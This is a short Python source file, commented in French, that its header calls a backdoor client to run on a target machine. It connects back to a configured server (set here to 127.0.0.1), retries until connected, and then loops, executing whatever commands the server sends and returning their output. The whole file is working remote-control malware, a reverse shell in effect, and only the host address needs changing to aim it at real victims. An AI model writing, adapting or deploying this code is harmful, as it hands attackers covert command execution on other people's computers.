# Backdoor client a executer sur la machine cible

import socket
import time
import clientSubProcess

MAX_SIZE_MSG = 1024
HOST_IP = "127.0.0.1"
HOST_PORT = 32561

# on cree le canal de connexion
canal_connexion = socket.socket()

# on tente la connexion
while True:
    try:
        canal_connexion.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur de connexion, reconnexion")
        time.sleep(3)
    else:
        print(f"Connexion reussi au serveur {HOST_IP}:{HOST_PORT}")
        break

# on effectue des echanges avec le serveur
while True:
    cmd = canal_connexion.recv(MAX_SIZE_MSG)    # on recoit les commande du serveur
    if cmd:     # si on recoit la cmd on l'execute puis on renvoie la sortie standard ou d'erreur de la commande
        cmd_str = cmd.decode()
        if cmd_str == "@exit":
            break
        resultat = clientSubProcess.execution(cmd_str)
        if not resultat:
            resultat = "."
        # envoie des donnees
        # le header contient la taille des donnees a envoyer
        # taille de l'entete en octet de 12 chiffres, zfill(n) permet de completet avec des zero jusqua avoir n chiffre

        if type(resultat) is bytes:    # si c'est deja en binaire pas besoin de conversion en binaire
            header = str(len(resultat)).zfill(12)
            canal_connexion.sendall(header.encode())    # entete (on encode car header est un str)
            canal_connexion.sendall(resultat)           # data
        else:
            header = str(len(resultat.encode())).zfill(12)
            canal_connexion.sendall(header.encode())        # entete
            canal_connexion.sendall(resultat.encode())      # data

# on ferme le canal
canal_connexion.close()
